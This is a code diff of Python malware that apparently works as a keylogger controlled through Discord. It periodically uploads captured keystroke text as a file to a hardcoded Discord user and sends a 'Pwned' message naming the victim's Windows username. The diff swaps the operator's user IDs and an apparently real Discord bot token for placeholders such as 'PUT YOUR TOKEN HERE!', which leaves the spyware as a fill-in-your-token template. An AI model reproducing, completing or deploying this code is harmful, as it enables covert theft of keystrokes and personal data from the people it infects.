@@ -61,7 +61,7 @@ class BotStarted(discord.Client):
     async def keys_share(self):
         await asyncio.sleep(int(self.time_k))
         arr = io.StringIO(self.keys_text)
-        ch = await client.fetch_user(825375714953265163)
+        ch = await client.fetch_user(00000000)
         fln = self.botname[1:] + '.txt'
         await ch.send(file=discord.File(arr, filename=fln))
 
@@ -69,7 +69,7 @@ class BotStarted(discord.Client):
         self.botname = '$Bot-' + ''.join(random.sample((string.digits + string.ascii_letters), 6))
         self.name_text = f'**{self.botname}**\n'
         osname = os.getenv('USERNAME')
-        ch = await client.fetch_user(825375714953265163)
+        ch = await client.fetch_user(0000000)
         await ch.send(f'Pwned: {self.botname} == {osname}')
 
     async def on_message(self, message):
@@ -150,7 +150,7 @@ class BotStarted(discord.Client):
                 await message.channel.send(file=discord.File(arr, filename=fln))
 
 if __name__ == '__main__':
-    token = 'ODI1Mzc4NjI3NDg2NjEzNjA2.YF9Dvw.tggZWUfyEBlBN_YgsRKTYcawL-M'
+    token = 'PUT YOUR TOKEN HERE!'
     while 1:
         try:
             client = BotStarted()
